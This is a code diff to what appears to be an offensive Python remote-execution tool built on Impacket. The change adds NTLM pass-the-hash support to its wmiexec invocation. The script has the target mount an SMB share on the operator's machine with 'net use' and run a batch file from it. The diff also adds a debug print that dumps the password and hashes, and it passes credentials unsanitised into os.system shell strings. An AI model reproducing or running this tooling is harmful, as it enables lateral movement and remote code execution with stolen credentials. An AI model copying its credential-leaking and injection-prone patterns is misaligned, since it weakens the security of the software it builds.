@@ -227,8 +227,8 @@ def main():
                        help='Destination port to connect to SMB Server')
     group = parser.add_argument_group('authentication')
 
-    group.add_argument('-localauth', action='store_true', default=False, help='Use a local account for authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-localauth', action="store_true", default=False, help='Use local account authentication')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true",
                        help='Use Kerberos authentication. Grabs credentials from ccache file '
@@ -242,6 +242,7 @@ def main():
 
 
     domain, username, password, remoteName = parse_target(args.target)
+    hashes = args.hashes
 
     if domain is None:
         domain = ''
@@ -358,9 +359,16 @@ def main():
             f'net use Q: \\\\{local_ip}\\{share_name} /user:{share_user} {share_pass}  && Q:\\tempbat.bat'
         )
         print(command)
+        if args.hashes is not None : 
+            hasheshash = f'-hashes \'{args.hashes}\''
+        else : 
+            hasheshash = ''
 
-
-        os.system(f'python wmiexec.py {domain}/{username}:\'{password or ""}\'@{remoteName}  \'{command}\'')
+        print(hasheshash, domain, username, password, remoteName)
+        if args.hashes != None :
+            os.system(f'python wmiexec.py {hasheshash} {domain}/{username}@{remoteName}  \'{command}\'')
+        else : 
+            os.system(f'python wmiexec.py {domain}/{username}:{password}@{remoteName}  \'{command}\'')
 
         # Create temporary mount directory
         mount_dir = create_temp_mount()
